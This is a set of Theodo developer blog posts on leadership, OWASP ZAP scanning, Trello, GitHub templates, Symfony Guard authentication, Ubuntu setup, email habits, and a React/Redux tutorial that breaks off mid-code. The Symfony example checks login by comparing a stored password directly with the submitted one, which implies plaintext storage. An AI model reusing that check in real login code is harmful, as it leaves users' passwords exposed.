{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhat Is Leadership?\nAt Theodo, we do not define a leader as some charismatic individual who gets everyone to adopt their own vision of things. Rather, we consider someone to be an effective leader if they always strive to\u2013and succeed at\u2013bringing lasting, positive change to their organization.\nHow they do this, though, be it through exceptional charisma, \u2018vision\u2019, or something else entirely, is not important.\nExcept it is.\nHow exactly does one successfully bring about positive change to an organization? In this article, I will present a quick and dirty guide to leadership, through five simple steps. \nMindset of a Leader\n\nYou have a real problem to fix\nThe start of the leadership process is often an issue that is bothering you, some pesky thing you\u2019d like to fix. However, you will not be able to convince\u2013let alone lead\u2013anyone if you talk about \u201csome pesky thing I\u2019d like to fix\u201d. You must formulate your issue as a real problem :\n\nWhat is bothering you?\nWhat are the measurable negative consequences to your organisation?\nWhat do you think the causes of this problem are? (you should have a rough but long list at this point)\n\nGet off your chair !\nLeading change in an organization takes a surprising amount of energy. This is why, in any leadership process, the first thing to do is to Get Off Your Chair, start moving things, and do not sit back down until you are done.\nStep 1: Identify Your Sponsor\nBefore taking action, you must observe the organization you are in, and ask people around you about it. Pay attention to the individuals, and to the teams:\n\nWho seems to be open to change, who seems to be against it?\nHow much influence does each person carry? Is it through authority, respect, expertise, or their relationships?\n\nThrough these observations, you should be able to identify someone (or several someones) in the organization to sponsor your idea. These are the early-adopters, the experts, the decision-makers. However, they are not necessarily the organisation\u2019s \u2018bosses\u2019!\nStep 2: Go and Talk to Them\nLeadership does not work through email. Leadership only works through one-on-one conversations. So go and talk to them!\nThis step may sound terribly obvious, and ridiculously easy, but once you are confronted with it in reality, it often turns out to be the hardest of all steps.\nStep 3: Be Sincere, Understand, Relate\n\nBe Sincere:\n\nEnter the conversation with an open mind. You must be sincerely ready to change your point of view if need be.\nStart your point with why, then work your way to how, and finish with what (this is called the Golden Circle and is the most persuasive communication tool out there)\n\n\nStrive to Understand Their Problems:\n\nMake the debate non-personal, stay focused on facts and rationality\nIf they sound opposed to your idea, listen to their problems, and work rationally with your target to reconcile them with your idea.\n\n\nRelate:\n\nThroughout this discussion, it is of utmost importance to empathize with the person. Put yourself in their shoes.\nAt the same time, try to make them relate to you, do not be afraid to show some vulnerability and open your feelings to them.\n\n\n\nStep 4: Plan How to Address the Problem\u2026\nNow that you\u2019ve talked to your sponsor and persuaded them to get on board with your idea, keep the momentum going ! Capitalize on it.\nThat\u2019s when you Plan (the first step in PDCA) how to address the problem. In order to do so, you should consult with experts on the topic, as well as the people who are impacted by your issue.\nDo this fast, one or two days tops (remember: speed is a habit).\nStep 5: \u2026and Address It !\nOnce you\u2019ve got a relatively solid plan, send a recap email to your target and any other important stakeholders. \nFinally, go and see them yet again to do what you planned, then check if your plan\u2019s hypotheses are correct, and and (re)act accordingly.\nConclusion\nSo the next time you identify a problem in your organization, treat it not as a hurdle but as an opportunity to improve. As with any opportunity, you should grab it for yourself. You should be the one to bring your idea into being. Not someone \u201cmore qualified\u201d, or \u201cwith a higher rank\u201d, you.\nIf, that is, you are willing to follow the above steps and become a leader.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMelchior Merlin\r\n  \t\t\t\r\n  \t\t\t\tDevelopper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tAs a Web developer, and above all, as someone who is interested in bringing value as soon as possible to my client, one of my main goals is to release the features I developed into production as soon as possible. In order to do so, I have to make sure my application is as secure as it can be before being deployed in a dangerous and full of malicious users production environment.\nThus, I have no choice: I have to get better in finding and fixing security flaws in my apps, I have to be able to test my apps, and to stop making the same errors twice. And I have to be fast doing it.\nThis is why I started to use OWASP Zed Attack Proxy!\nWhat is ZAP?\nZAP is an OWASP (Open Web Application Security Project) project. OWASP is an online community which goal is to promote security for Web applications in a free and open way. To achieve their goal, they offer for instance vulnerable applications for every one to test and train on, documentations and recommendations, and security testing tools such as ZAP.\nZAP is therefore an open-source Github project. I could not advise you enough to go and visit the repository to read the code, and, if you are interested enough, to contribute to the project.\nThe interesting thing about ZAP is it is as useful for beginners in security as for professionals! Beginners can use it because it does not require advanced knowledge before you start getting results using it. Actually, you only need to click on one button to attack your application with minimal configuration.\nOnce you understand how to use it, you can achieve pretty impressive results. Zap is therefore used by professionals in security and is often rewarded. It has been for instance voted as the best security tool in the ToolsWatch (a famous security website) 2015 Top 10. And as I write this post, ZAP just reached 1000 stars on Github!\nWhat can you use ZAP for?\nA proxy\nAs its name indicates, ZAP is a proxy. It means it will be set between your server and your web browser, and will listen all HTTP requests and responses. You can read and review them, and you can intercept them just after they leave your browser, or just before they come back in. The most interesting part is that you can then modify them. This is pretty useful in order to bypass client only verification for instance.\nPassive scanning\nAs ZAP listens to all HTTP requests and responses you will send and receive, it will parse them, store them in a tree representation of your application. It will also take this opportunity to scan them in order to detect the first vulnerabilities.\nSpidering\nWhether you developed the application yourself or not, it is highly probable that you will not visit every single link of the application yourself. Whether because you do not know everything about the application, or because it is really too long to visit each page by yourself, it is better to use the spidering tool of ZAP. The goal of this tool is to parse the HTTP responses of the pages you already visited in order to discover new content. Each time it finds a new page, ZAP requests it, and can in turn parse the response. This way, hidden content can be discovered! There again,every new request/response pair is stored in the tree I mentioned earlier. My recommendation is to begin your testing by visiting manually some pages of your application, and then let ZAP list all the rest of its content automatically.\nAttack!\nWhen ou are ready to go further, you may begin the real attack. At this point, ZAP active scanning will enable you to find more vulnerabilities such as SQL injections or XSS. Beware! The attacks will really be executed, so be careful, and do not look for such flaws in production environment. You may also use fuzzing to tamper with some parameters of the requests you\u2019re playing with.\nReporting\nEvery vulnerability reported by ZAP will be displayed in the \u201cAlerts\u201d tab. This is probably my favorite feature in ZAP! There, you will gain huge knowledge in Web Security. For each alert, you can learn about the corresponding flaw. Among other things, you will see which parameter can be used for the exploit, what this vulnerability might enable you to do, how to fix it, and some links to follow in order to discover more about it. Alerts are sorted according to their risk and impact. When some low vulnerabilities might not have too much impact for your application, you should really look into the high ones!\nConfiguration\nWhen you have found your first vulnerabilities with ZAP, you may want to go further still and make some more powerful and productive testing. For this, you can teach ZAP how your app works, and configure it to make it more accurate. For instance, you could explain to ZAP how it can know whether it is authenticated or not, and how it can be sure to be logged in. This way, even if it follows a logout link or is logged out by the application because of safety mechanisms, it will be able to log in again!\nYou may also download some community made extensions or scripts (or even write them yourself!) within the application. For example, you may install parameters for better fuzzing, quick start guide, or even a selenium extension. Thereby, there is virtually no limit to what you can achieve with this tool!\nDo bad things\u2026 for the right reasons\nZAP\u2019s motto above is really meaningful! Everything ZAP enables you to do should be considered as hacking. This means you should never use it against an application that you do not own, or for which you dit not receive specific authorization.\nHowever, you should always test your applications and look for vulnerabilities. First, this is an opportunity to get better and make safer applications for your users! And, more importantly, you do NOT want anybody to find critical flaws in your application. And trust me: if they are accessible on the Web, sooner or later, they will be found.\nThe only thing left now is for you to download ZAP and go test it! Merry hacking!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tPaul Molin\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tTrello is the perfect online equivalent of the whiteboard\nTo build a perfect Scrumboard, we need:\n\nColumns and Cards\nComplexity points on each card\nNumber of Cards by column\nCard Numbers\nLabels\n\n1) Columns and Cards\nTrello provides drag&drop cards. Tips: You can use < and > shortcuts to move the card to the near columns.\n2) Complexity points on each card\nI chose to use ScrummerTheodo\u00a0to display complexity points on each card. Thanks to this extension, we can also add \u201cpost estimated\u201d complexity points afterwards. Bonus: The sum of every column\u2019s cards is displayed on top of it.\n\nScrummerTheodo, Chrome Extension\nScrummerTheodo, Firefox Extension\n\nREX: I used Scrum for Trello Plugins but it slowed down the board too much. So Theodoers\u00a0decided to fork Vanilla JS Plugins\u00a0rickpastoor/scrummer\u00a0in order to add post estimation feature and improve UX.\n3) Number of Cards by column\nI first used the CardCounter for Trello plugin. Personnaly, I find the big permanent orange square is too flashy and add noise to the board.\nI prefer f shortcut and type *. This will filter all the cards by \u2018nothing\u2019 and display the number of cards found in each column. No plugin to add and display the number of cards only when you need it.\n4) Card Numbers\nI chose to use a plugin that have only one job and make it good:\n\nTrello Card Numbers, Chrome Extension\nTrello Card Numbers, Firefox Extension\n\nYou can use Stylish and find a CSS Theme that will change your board appareance in order to display the Card Number. Cons: Stylish ask the permission to read all data from all the websites you visit.. then it\u2019s difficult to find a theme that not break the Trello design.\n5) Labels\nThere\u2019s an extension for that:\n\nCard Color Titles for Trello, Chrome Extension\nCard Color Title for Trello, Firefox Extension\n\nEnjoy!\n\nBe agile and deliver fast!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tJonathan Beurel\r\n  \t\t\t\r\n  \t\t\t\tJonathan Beurel - Web Developer. Twitter : @jonathanbeurel  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tGitHub released in February a new functionality that the community has been asking for years. It\u2019s now possible to set up templates for issues and pull requests!\nHow does it work?\nImplementing these new templates is quite easy.\nStep One:\nCreate a .github folder in the root directory of your project.\ncd ../path/to/your/project\r\nmkdir .github\r\n\nStep Two:\nAdd a PULL_REQUEST_TEMPLATE.md or/and ISSUE_TEMPLATE.md in the .github folder you\u2019ve just created.\ncd .github\r\nvim PULL_REQUEST_TEMPLATE.md\r\n# your template for PRs\r\nvim ISSUE_TEMPLATE.md\r\n# your template for issues\r\n\nHere is an example of what your pull request template might look like:\n## Link to the user story\r\n[User Story 3](https://trello.com/path/to/my/board)\r\n\r\n## Screenshots\r\n\r\n## Types of changes\r\n\r\n- [ ] Bug fix\r\n- [ ] New feature\r\n- [ ] Breaking change\r\n\r\n## Maintainability & Security\r\n\r\n- [ ] The feature is tested\r\n- [ ] My PR complies with the security checklist\r\n- [ ] The code coverage is higher than 80%\r\n\r\n## Coding Style\r\n- [ ] Functions are no longer than 30 lines\r\n- [ ] Each function is only performing one task\r\n- [ ] Files are no longer than 200 lines\r\n\r\n<!-- You can add as many items as you like. Your imagination is the limit. -->\r\n\r\n\nIf you feel like you can get easily bored by this task, you might want to use this bookgame \ud83d\ude09.\nStep Three:\nCommit, push and that\u2019s it, you are ready to go \ud83d\ude03. Now each time a contributor will open a pull request or an issue on your project, the body of their request will be pre-filled with the template you\u2019ve created.\nWhy templates have more impact than you think\nIt is so easy to implement, that it seems to be a little thing. It can actually make both your life and those of your contributors easier:\n\nYour contributors will know exactly what information they have to give you and what actions they have to perform in order to see their request treated.\nYour contributors know the standards they must follow therefore it increase the code quality of your application.\nYou will be able to assess how much time you will have to spend on the request without having to put extra effort looking for the information you need.\n\nAt Theodo we are quite fond of this new feature since it helps us constantly improving the quality of our work. For instance, we\u2019ve noticed that functionalities have often been refused by our product owner for the same reason (e.g. we didn\u2019t follow the wireframe). We added an item to the checklist prevent this reason from appearing again. In our case, it was \u201cI have checked that the functionality complies with the wireframes\u201d. Thanks to the template we never forget to follow the wireframe thus never waste the time of our product owner with this problem anymore. That\u2019s why templates are a good way to increase the value we bring to our clients.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tThibault Coudray\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tBuilding a custom authentication system for Symfony can get atrocious.\nYou can get a glimpse of that here.\nYou have to deal with multiple classes, connect them to each other, and hope for the best.\nIt is hard to customize and never fun to work with.\nSince Symfony 2.8, to simplify the customization of the authentication process, Guard has been introduced.\nWith Guard, you will not have any struggle building your own authentication system.\nIt does not redesign the existing authentication system included in Symfony, it plugs itself onto it, making your life easier.\nLet\u2019s explain how it works, and how you can use it!\nCreating an Authenticator\nWith Guard, every step of the authentication process is handled by only one class: an Authenticator.\nThis class will have to implement the provided GuardAuthenticatorInterface.\nThis interface comes with seven simple methods:\nstart(Request $request, AuthenticationException $authException = null)\nThis gets called when the user tries to access a resource that requires authentication, but no authentication information was found in the request.\nIts job is to inform the client that he has to send those authentication details.\nThis method is a bit different from the others, since it comes from AuthenticationEntryPointInterface, which is extended by GuardAuthenticatorInterface.\nFor example, you could redirect him to the login page:\n/**\r\n * @var \\Symfony\\Component\\Routing\\RouterInterface\r\n */\r\nprivate $router;\r\n\r\npublic function start(Request $request, AuthenticationException $authException = null)\r\n{\r\n  $url = $this->router->generate('login');\r\n  return new RedirectResponse($url);\r\n}\r\n\ngetCredentials(Request $request)\nThis method will get called on every request that requires an authentication.\nIts job is to read the authentication information contained in the request, and return it.\nYou can return what you want! The only purpose what you return is to get used in the getUser() and checkCredentials() methods.\nIf this method returns null, authentication will fail.\nSo if the endpoint requires an authentication, the method start() will get called.\nIf not, the authentication gets skipped, the user is the famous \"anon\".\nIf you return a non null value, the method getUser() will get called.\nTwo examples:\n// for an API\r\npublic function getCredentials(Request $request)\r\n{\r\n  return $request->headers->get('X-API-TOKEN');\r\n}\r\n\r\n// for a form login\r\npublic function getCredentials(Request $request)\r\n{\r\n  return array(\r\n    'username' => $request->request->get('_username'),\r\n    'password' => $request->request->get('_password'),\r\n  );\r\n}\r\n\ngetUser($credentials, UserProviderInterface $userProvider)\nAfter you\u2019ve gotten the credentials, you will try to get the User associated with those credentials.\nThe value of the credentials is passed to getUser() as the $credentials argument.\nThe job of this method is to return an object implementing UserInterface.\nIf it does, the next step of the authentication will be called: checkCredentials().\nElse, the authentication will fail and the method onAuthenticationFailure() will get called.\nAn example:\n# for an API\r\npublic function getUser($credentials, UserProviderInterface $userProvider)\r\n{\r\n  $user = $this->em->getRepository('AppBundle:User')\r\n      ->findOneBy(array('apiToken' => $credentials));\r\n\r\n  return $user;\r\n}\r\n\ncheckCredentials($credentials, UserInterface $user)\nThe job of this method is to check if the credentials of the previously returned User are correct.\nThis method can do two things.\nIf it returns true, the user will be authenticated, and the method onAuthenticationSuccess() will be called.\nIf does not, the authentication fails and the method onAuthenticationFailure() is called.\nEven if it works without, throwing any kind of AuthenticationException lets you explicit what went wrong.\nAn example with a password:\npublic function checkCredentials($credentials, UserInterface $user)\r\n{\r\n  if ($user->getPassword() === $credentials['password']) {\r\n    return true;\r\n  }\r\n\r\n  throw new MyCustomAuthenticationException('The credentials are wrong!');\r\n}\r\n\nonAuthenticationSuccess(Request $request, TokenInterface $token, $providerKey)\nThis method is called when the user is successfully authenticated.\nIt can return null, in which case the request continues to process as expected, or return a Reponse object, in which case this Response will be transfered to the user.\nFor example, you can redirect your users to the homepage:\n/**\r\n * @var \\Symfony\\Component\\Routing\\RouterInterface\r\n */\r\nprivate $router;\r\n\r\npublic function __construct(RouterInterface $router)\r\n{\r\n  $this->router = $router;\r\n}\r\n\r\n# ...\r\n\r\npublic function onAuthenticationSuccess(Request $request, TokenInterface $token, $providerKey)\r\n{\r\n  $url = $this->router->generate('homepage');\r\n\r\n  return new RedirectResponse($url);\r\n}\r\n\nonAuthenticationFailure(Request $request, AuthenticationException $exception)\nThis method is called when the authentication fails.\nIts job is to return a Reponse object that will be sent to the client.\nYou will know what went wrong in the process with the $exception parameter.\nFor example, you can return a custom JSON response:\npublic function onAuthenticationFailure(Request $request, AuthenticationException $exception)\r\n{\r\n  return new JsonResponse(array('message' => $exception->getMessageKey()), Response::HTTP_FORBIDDEN);\r\n}\r\n\nsupportsRememberMe()\nReturn true with this method if you want the remember me functionality to be active, false otherwise.\nIt will still requires the activation of the remember_me under your firewall to work.\nA very simple example:\npublic function supportsRememberMe()\r\n{\r\n  return false;\r\n}\r\n\nregistering your Authenticator\nYou have built a very nice Authenticator, but how can you use it in your application?\nFirst, register in your security.yml file, under the firewall sections, that you will be using Guard.\nFor example:\nfirewalls:\r\n    secured_area:\r\n        anonymous: ~\r\n        logout:\r\n            path:   /logout\r\n              target: /\r\n        guard:\r\n            authenticators:\r\n                - my_custom_authenticator\r\n\nThen, register your Authenticator as a service, for example in your service.yml:\nservices:\r\n    my_custom_authenticator:\r\n        class: AppBundle\\Security\\Authenticator\r\n        arguments: [\"@router\"]\r\n\nYou can even specify multiple authenticators like so:\nguard:\r\n    authenticators:\r\n        - my_custom_authenticator\r\n        - my_facebook_authenticator\r\n    entry_point: my_custom_authenticator\r\n\nIt this case, you will have to tell your application which authenticator will be your entry point, that is which start() method will be called when an anonymous user tries to access a resource requiring authentication.\nAnd that\u2019s it! You can now build your own custom authentication process, and only by implementing very simple methods.\nYou can easily use Guard to allow an authentication via Facebook, Google+, Github or whatever application you want.\nHave a nice time building your Symfony authentication systems!\n\u00a0\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAntoine Kahn\r\n  \t\t\t\r\n  \t\t\t\tWebdeveloper at Theodo.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThis article explains the differences I found between Trusty and Xenial to run a Symfony application.\nSo what\u2019s new in the latest Ubuntu LTS release? On the application side we have:\n\nPHP 7.0\nNginx 1.9.15\nPython 3.5\nPostgresql 9.5\nMysql 5.7.11\nMongo 2.6.10\nDocker 1.10\n\nThis nice DigitalOcean post provides a great overview.\nFrom Trusty to Xenial\nMy goal was to run the default project from the Symfony installer on a Vagrant VM.\nI also wanted to be able to use Mysql, Postgresql or Mongodb.\nI explain below, all the steps I needed to do so.\nFirst I ran: symfony new xenial64 to quickly get all the Symfony files.\nThen I looked for the official Vagrant box of Xenial and found it here.\nMy next step was using my Ansible playbook generator to get a first draft of a provisioning.\nI updated the Vagrantfile to use the right Vagrant box\n and I ran vagrant up.\nUnfortunately an error occurred and I wasn\u2019t the only one.\nAs I didn\u2019t want to wait for the next release of Vagrant, I moved away from the official box\nto an unofficial one.\nIt worked without any error this time.\nI then launched the provisioning with ansible-playbook devops/provisioning/playbook.yml -i devops/provisioning/hosts/vagrant and met my first\nerrors during the PHP role.\nChanges related to PHP.\nI needed to update the role as we are now using PHP 7.\nI manually installed all the PHP packages needed, as I didn\u2019t know their name, this\npage was very useful.\nHere is a short list:\n- php\r\n- php7.0-mysql\r\n- php7.0-pgsql\r\n- php7.0-mcrypt\r\n- php7.0-curl\r\n- php7.0-dev\r\n- php7.0-gd\r\n- php7.0-ldap\r\n- php7.0-sqlite3\r\n- php7.0-intl\r\n- php-apcu\r\n\nNote that the PHP conf files has also slightly changed their location from /etc/php5 to /etc/php/7.0.\n\nChanges related to Nginx\nEverything went well except that the php-fpm socket has changed from /var/run/php5-fpm.sock to /var/run/php/php7.0-fpm.sock.\nChanges related to Mongodb\nThings are now much simpler than before because a apt-get install mongodb is now enough to install Mongodb.\nPostgresql\nNo problem =)\nMysql\nI had one issue with the /etc/mysql/my.cnf configuration file. It has been splitted into different files so it\u2019s a little bit harder to set the right configuration.\nOtherwise everything was OK.\nConclusion\nAnd this is it, if you want to try by yourself everything is here.\n\nYou will find a Vagrantfile, an Ansible provisioning and the Symfony files.\nIf you want to know more about Xenial, here are some useful links:\n\nThe Subreddit Ubuntu\nOne Hacker news discussion.\n\nDon\u2019t hesitate to share with us the best links you found. If you have questions, you can ask me on twitter.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMaxime Thoonsen\r\n  \t\t\t\r\n  \t\t\t\tEducation Hacker. Full Stack developer - Agile and Lean Coach\r\nTwitter: https://twitter.com/maxthoon\r\nGithub: https://github.com/MaximeThoonsen  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tI recently had a quick formation with Beno\u00eet Charles-Lavauzelle our CEO at Theodo. He taught me how to be efficient at reading emails. Here are his advices:\n\ndon\u2019t sort emails. Use the search.\ndon\u2019t use multiple labels. One label is enough: urgent or not.\nfor each mail, there is two options: answer or decide not to answer. Necessarily, if you are to answer, this mail is important. Answer it quickly. Star each mail you have an action to do.\nmonitor your answering lead time. You must not have email older than 72 hours in your inbox.\nstart with older emails. It helps for the previous point.\ndon\u2019t use your mouse, use keyboard shortcuts instead. You must be able to: archive, answer, tag and go to next email without your mouse.\nuse boomerang (or google inbox\u2019s snooze, or follow-up then) for each of your answers that contains a question mark. It\u2019s the key of the follow up.\ndon\u2019t use tasks. Your todo list is your inbox. The inbox is your unique entry point.\nplanify time for reading email and answering the starred ones. 3 times a day is fine.\nif it takes less than 2 minutes to answer: do it immediately.\n\nThis list isn\u2019t exhaustive. Share your own advice in the comments!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tRapha\u00ebl Dubigny\r\n  \t\t\t\r\n  \t\t\t\tRapha\u00ebl is an agile web developer at Theodo. He uses angular, nodejs and ansible every day.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tImage credits: egghead.io\nThis is the second and last part of the React, Redux and Immutable tutorial. In case you missed it, the first part is available here.\nIn the first part, we laid the UI foundation for our app, developing and unit-testing modular components.\nWe saw that the state of our app was passed down to individual components as React props, and that user-actions were declared as callbacks, thus separating UI from app logic.\nIn case you\u2019re onboarding now or you would like to start this second part from exactly where we left earlier, here is a link to the commit from the companion repository I\u2019ll be starting from.\nFeel free to clone the repo and follow along!\nIntroducing the Redux workflow\nAt this point, our UI is not interactive: although we tested the fact that if an item is set as completed it will be stricken through, there is as yet no way to invite the user to complete it.\nIn the Redux ecosystem, UI updates and user options always follow the same workflow:\n\nThe state tree defines the UI and the action callbacks through props\nUser actions, such as clicks, are sent to an action creator that normalizes them\nThe resulting redux actions are passed to a reducer that implements the actual app logic\nThe reducer updates the state tree and dispatches it to a store that, well, stores it\nThe UI is updated accordingly to the new state tree in the store\n\n\nSetting the initial state\nNote: here is the relevant commit in the companion repository.\nOur first action will allow us to properly set the initial state in the Redux store, that we are about to create.\nAn action in Redux is a payload of information. As such, it is represented by a JSON object with a type attribute that describes concisely what the action does and other pieces of information devised by the needs of the app. In our case, the type can be set to SET_STATE and we can add a state object that contains the desired state:\n{\r\n  type: 'SET_STATE',\r\n  state: {\r\n    todos: [\r\n      {id: 1, text: 'React', status: 'active', editing: false},\r\n      {id: 2, text: 'Redux', status: 'active', editing: false},\r\n      {id: 3, text: 'Immutable', status: 'active', editing: false},\r\n    ],\r\n    filter: 'all'\r\n  }\r\n}\r\n\nThis action will be dispatched to a reducer, whose role will be to identify it and implement the actual logic associated with the action.\nIn our case, the logic will be to save the new state inside the store, so that it can be propagated through our app.\nLet\u2019s write the unit tests for our reducer:\ntest/reducer_spec.js\nimport {List, Map, fromJS} from 'immutable';\r\nimport {expect} from 'chai';\r\n\r\nimport reducer from '../src/reducer';\r\n\r\ndescribe('reducer', () => {\r\n\r\n  it('handles SET_STATE', () => {\r\n    const initialState = Map();\r\n    const action = {\r\n      type: 'SET_STATE',\r\n      state: Map({\r\n        todos: List.of(\r\n          Map({id: 1, text: 'React', status: 'active'}),\r\n          Map({id: 2, text: 'Redux', status: 'active'}),\r\n          Map({id: 3, text: 'Immutable', status: 'completed'})\r\n        )\r\n      })\r\n    };\r\n\r\n    const nextState = reducer(initialState, action);\r\n\r\n    expect(nextState).to.equal(fromJS({\r\n      todos: [\r\n        {id: 1, text: 'React', status: 'active'},\r\n        {id: 2, text: 'Redux', status: 'active'},\r\n        {id: 3, text: 'Immutable', status: 'completed'}\r\n      ]\r\n    }));\r\n  });\r\n\r\n});\r\n\nWe would also like, for convenience, to write the state object in plain JS instead of using Immutable data structures \u2013 and let our reducer handle the conversion. Finally, the reducer should handle an undefined initial state gracefully:\ntest/reducer_spec.js\n// ...\r\ndescribe('reducer', () => {\r\n  // ...\r\n  it('handles SET_STATE with plain JS payload', () => {\r\n    const initialState = Map();\r\n    const action = {\r\n      type: 'SET_STATE',\r\n      state: {\r\n        todos: [\r\n          {id: 1, text: 'React', status: 'active'},\r\n          {id: 2, text: 'Redux', status: 'active'},\r\n          {id: 3, text: 'Immutable', status: 'completed'}\r\n        ]\r\n      }\r\n    };\r\n    const nextState = reducer(initialState, action);\r\n    expect(nextState).to.equal(fromJS({\r\n      todos: [\r\n        {id: 1, text: 'React', status: 'active'},\r\n        {id: 2, text: 'Redux', status: 'active'},\r\n        {id: 3, text: 'Immutable', status: 'completed'}\r\n      ]\r\n    }));\r\n  });\r\n\r\n  it('handles SET_STATE without initial state', () => {\r\n    const action = {\r\n      type: 'SET_STATE',\r\n      state: {\r\n        todos: [\r\n          {id: 1, text: 'React', status: 'active'},\r\n          {id: 2, text: 'Redux', status: 'active'},\r\n          {id: 3, text: 'Immutable', status: 'completed'}\r\n        ]\r\n      }\r\n    };\r\n    const nextState = reducer(undefined, action);\r\n    expect(nextState).to.equal(fromJS({\r\n      todos: [\r\n        {id: 1, text: 'React', status: 'active'},\r\n        {id: 2, text: 'Redux', status: 'active'},\r\n        {id: 3, text: 'Immutable', status: 'completed'}\r\n      ]\r\n    }));\r\n  });\r\n});\r\n\nOur reducer will match the type of incoming actions, and if the type is SET_STATE, will merge the current state (in this case, the inital state) with the one in the payload:\nsrc/reducer.js\nimport {Map} from 'immutable';\r\n\r\nfunction setState(state, newState) {\r\n  return state.merge(newState);\r\n}\r\n\r\nexport default function(state = Map(), action) {\r\n  switch (action.type) {\r\n    case 'SET_STATE':\r\n      return setState(state, action.state);\r\n  }\r\n  return state;\r\n}\r\n\nWe now have to wire up the reducer with our app, so that when the app launches the initial state is set up using our action. This is actually our first call to the Redux library, so we have to install it as well:\nnpm install --save redux@3.3.1 react-redux@4.4.1\r\n\nsrc/index.jsx\nimport React from 'react';\r\nimport ReactDOM from 'react-dom';\r\nimport {List, Map} from 'immutable';\r\nimport {createStore} from 'redux';\r\nimport {Provider} from 'react-redux';\r\nimport reducer from './reducer';\r\nimport {TodoAppContainer} from './components/TodoApp';\r\n\r\n// We instantiate a new Redux store\r\nconst store = createStore(reducer);\r\n// We dispatch the SET_STATE action holding the desired state\r\nstore.dispatch({\r\n  type: 'SET_STATE',\r\n  state: {\r\n    todos: [\r\n      {id: 1, text: 'React', status: 'active', editing: false},\r\n      {id: 2, text: 'Redux', status: 'active', editing: false},\r\n      {id: 3, text: 'Immutable', status: 'active', editing: false},\r\n    ],\r\n    filter: 'all'\r\n  }\r\n});\r\n\r\nrequire('../node_modules/todomvc-app-css/index.css');\r\n\r\nReactDOM.render(\r\n  // We wrap our app in a Provider component to pass the store down to the components\r\n  <Provider store={store}>\r\n    <TodoAppContainer />\r\n  </Provider>,\r\n  document.getElementById('app')\r\n);\r\n\nIf you look closely to the previous code snippet, you may notice how the TodoApp component was substituded by TodoAppContainer. In Redux, there are two types of components: Presentational and Container. I encourage you to read this highly informative article by Dan Abramov that highlights the difference between the two.\nIf I were to sum it up quickly, I would quote the Redux docs:\n\u201cPresentational components are about how things look (styles and templates) and Container components are about how things work (data fetching, state updates).\u201d\nOkay, so we have our store set up and passed down at our TodoAppContainer component. However, in order for our child component to make sense of the store, we have to map the state attributes to React props for the TodoApp component \u2013 that is what gives us the TodoAppContainer:\nsrc/components/TodoApp.jsx\n// ...\r\nimport {connect} from 'react-redux';\r\n\r\nexport class TodoApp extends React.Component {\r\n// ...\r\n}\r\nfunction 